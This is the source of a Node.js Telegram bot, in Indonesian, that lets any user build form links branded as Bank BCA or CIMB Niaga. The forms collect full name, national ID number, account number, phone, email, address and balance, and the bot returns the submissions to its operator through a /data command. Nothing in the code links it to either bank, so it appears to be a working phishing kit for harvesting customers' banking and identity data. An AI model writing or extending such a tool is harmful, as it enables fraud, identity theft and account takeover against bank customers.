const TelegramBot = require("node-telegram-bot-api");
const db = require("./db");

const TOKEN = process.env.BOT_TOKEN;
const BASE_URL = process.env.BASE_URL;

const bot = new TelegramBot(TOKEN, { polling: true });

process.once("SIGINT", () => bot.stopPolling());
process.once("SIGTERM", () => bot.stopPolling());

const BANK_COLUMNS = {
  bca: {
    name: "Bank BCA", emoji: "🏦",
    columns: [
      { id: "nama", label: "Nama Lengkap" },
      { id: "nik", label: "NIK / No. KTP" },
      { id: "no_rekening", label: "Nomor Rekening" },
      { id: "nama_rekening", label: "Nama di Rekening" },
      { id: "no_hp", label: "Nomor HP" },
      { id: "email", label: "Email" },
      { id: "alamat", label: "Alamat" },
      { id: "kota", label: "Kota" },
      { id: "cabang", label: "Cabang BCA" },
      { id: "jenis_akun", label: "Jenis Akun" },
      { id: "saldo", label: "Saldo Awal" },
      { id: "tanggal", label: "Tanggal Pembukaan" },
    ],
  },
  cimb: {
    name: "Bank CIMB Niaga", emoji: "🏛️",
    columns: [
      { id: "nama", label: "Nama Lengkap" },
      { id: "nik", label: "NIK / No. KTP" },
      { id: "no_rekening", label: "Nomor Rekening" },
      { id: "nama_rekening", label: "Nama di Rekening" },
      { id: "no_hp", label: "Nomor HP" },
      { id: "email", label: "Email" },
      { id: "alamat", label: "Alamat" },
      { id: "kota", label: "Kota" },
      { id: "cabang", label: "Cabang CIMB" },
      { id: "jenis_akun", label: "Jenis Akun" },
      { id: "saldo", label: "Saldo Awal" },
      { id: "tanggal", label: "Tanggal Pembukaan" },
      { id: "swift", label: "Kode SWIFT" },
    ],
  },
};

const userSessions = {};

function getSession(userId) {
  if (!userSessions[userId]) {
    userSessions[userId] = { step: "idle", bank: null, selectedColumns: [], page: 1, chatId: null };
  }
  return userSessions[userId];
}

function resetSession(userId) {
  userSessions[userId] = { step: "idle", bank: null, selectedColumns: [], page: 1, chatId: null };
}

function generateFormId() {
  return Math.random().toString(36).substring(2, 10).toUpperCase();
}

function bankKeyboard() {
  return { inline_keyboard: [[
    { text: "🏦 Bank BCA", callback_data: "bank_bca" },
    { text: "🏛️ CIMB Niaga", callback_data: "bank_cimb" },
  ]]};
}

function columnKeyboard(bankKey, selected, page = 1) {
  const bank = BANK_COLUMNS[bankKey];
  const PER_PAGE = 6;
  const total = Math.ceil(bank.columns.length / PER_PAGE);
  const cols = bank.columns.slice((page-1)*PER_PAGE, page*PER_PAGE);
  const rows = [];
  for (let i = 0; i < cols.length; i += 2) {
    const row = [];
    for (let j = i; j < Math.min(i+2, cols.length); j++) {
      const c = cols[j];
      row.push({ text: `${selected.includes(c.id) ? "✅" : "⬜"} ${c.label}`, callback_data: `col_${c.id}` });
    }
    rows.push(row);
  }
  const nav = [];
  if (page > 1) nav.push({ text: "◀️ Prev", callback_data: `page_${page-1}` });
  if (page < total) nav.push({ text: "Next ▶️", callback_data: `page_${page+1}` });
  if (nav.length) rows.push(nav);
  const actions = [];
  if (selected.length >= 1) actions.push({ text: "💾 Simpan & Buat Link", callback_data: "save" });
  actions.push({ text: "➡️ Halaman Berikutnya", callback_data: "preview" });
  rows.push(actions);
  rows.push([
    { text: "🔄 Reset", callback_data: "reset" },
    { text: "🔙 Ganti Bank", callback_data: "change_bank" },
  ]);
  return { inline_keyboard: rows };
}

function previewKeyboard() {
  return { inline_keyboard: [
    [{ text: "🔗 Buat Link Form", callback_data: "save" }],
    [{ text: "✏️ Edit Kolom", callback_data: "edit" }],
    [{ text: "🏠 Mulai Ulang", callback_data: "restart" }],
  ]};
}

bot.onText(/\/start|\/buat/, (msg) => {
  const userId = msg.from.id;
  resetSession(userId);
  getSession(userId).chatId = msg.chat.id;
  bot.sendMessage(msg.chat.id, `👋 *Selamat datang!*\nPilih bank:`, { parse_mode: "Markdown", reply_markup: bankKeyboard() });
});

bot.on("callback_query", async (query) => {
  const userId = query.from.id;
  const chatId = query.message.chat.id;
  const msgId = query.message.message_id;
  const data = query.data;
  const s = getSession(userId);
  s.chatId = chatId;
  await bot.answerCallbackQuery(query.id);

  const edit = (text, markup) => bot.editMessageText(text, { chat_id: chatId, message_id: msgId, parse_mode: "Markdown", reply_markup: markup });

  if (data.startsWith("bank_")) {
    s.bank = data.replace("bank_", "");
    s.selectedColumns = []; s.page = 1;
    const b = BANK_COLUMNS[s.bank];
    return edit(`${b.emoji} *${b.name}*\nTerpilih: *${s.selectedColumns.length}*`, columnKeyboard(s.bank, s.selectedColumns, 1));
  }

  if (data.startsWith("col_")) {
    const id = data.replace("col_", "");
    const idx = s.selectedColumns.indexOf(id);
    if (idx === -1) s.selectedColumns.push(id); else s.selectedColumns.splice(idx, 1);
    const b = BANK_COLUMNS[s.bank];
    return edit(`${b.emoji} *${b.name}*\nTerpilih: *${s.selectedColumns.length}*`, columnKeyboard(s.bank, s.selectedColumns, s.page));
  }

  if (data.startsWith("page_")) {
    s.page = parseInt(data.replace("page_", ""));
    const b = BANK_COLUMNS[s.bank];
    return edit(`${b.emoji} *${b.name}*\nTerpilih: *${s.selectedColumns.length}*`, columnKeyboard(s.bank, s.selectedColumns, s.page));
  }

  if (data === "reset") {
    s.selectedColumns = [];
    const b = BANK_COLUMNS[s.bank];
    return edit(`${b.emoji} *${b.name}*\n🔄 Reset. Terpilih: *0*`, columnKeyboard(s.bank, s.selectedColumns, 1));
  }

  if (data === "change_bank") {
    s.bank = null; s.selectedColumns = [];
    return edit(`🏦 *Pilih Bank:*`, bankKeyboard());
  }

  if (data === "preview") {
    if (s.selectedColumns.length === 0) return;
    const b = BANK_COLUMNS[s.bank];
    const labels = s.selectedColumns.map(id => `• ${b.columns.find(c=>c.id===id)?.label||id}`).join("\n");
    return edit(`📋 *RINGKASAN*\n\n${b.emoji} *${b.name}*\n📌 *Kolom:*\n${labels}`, previewKeyboard());
  }

  if (data === "save") {
    if (s.selectedColumns.length === 0) return;
    const formId = generateFormId();
    await db.saveForm(formId, s.bank, s.selectedColumns);
    const link = `${BASE_URL}/form/${formId}`;
    const b = BANK_COLUMNS[s.bank];
    return edit(
      `✅ *Link Berhasil Dibuat!*\n\n${b.emoji} *${b.name}*\n📋 Kolom: ${s.selectedColumns.length}\n\n🔗 *Link Form:*\n${link}\n\n📊 Lihat data: /data ${formId}`,
      { inline_keyboard: [[{ text: "🆕 Buat Form Baru", callback_data: "restart" }]]}
    );
  }

  if (data === "edit") {
    s.page = 1;
    const b = BANK_COLUMNS[s.bank];
    return edit(`${b.emoji} *${b.name}*\nTerpilih: *${s.selectedColumns.length}*`, columnKeyboard(s.bank, s.selectedColumns, 1));
  }

  if (data === "restart") {
    resetSession(userId);
    return edit(`🏦 *Pilih Bank:*`, bankKeyboard());
  }
});

bot.on("message", (msg) => {
  if (msg.text && msg.text.startsWith("/data")) {
    const formId = msg.text.split(" ")[1]?.toUpperCase();
    if (!formId) return bot.sendMessage(msg.chat.id, "Format: /data FORMID");
    db.getSubmissions(formId).then(rows => {
      if (!rows.length) return bot.sendMessage(msg.chat.id, `📭 Belum ada data untuk form ${formId}`);
      let text = `📊 *Data Form ${formId}*\nTotal: ${rows.length}\n\n`;
      rows.slice(0,5).forEach((r,i) => {
        text += `*${i+1}.* ${new Date(r.submitted_at).toLocaleString("id-ID")}\n`;
        Object.entries(r.data).forEach(([k,v]) => { text += `  • ${k}: ${v}\n`; });
        text += "\n";
      });
      bot.sendMessage(msg.chat.id, text, { parse_mode: "Markdown" });
    });
    return;
  }
  if (msg.text && !msg.text.startsWith("/")) {
    bot.sendMessage(msg.chat.id, `💡 /start - Mulai\n/buat - Buat form\n/data [ID] - Lihat data`);
  }
});

console.log("🤖 Bot aktif...");
module.exports = {};
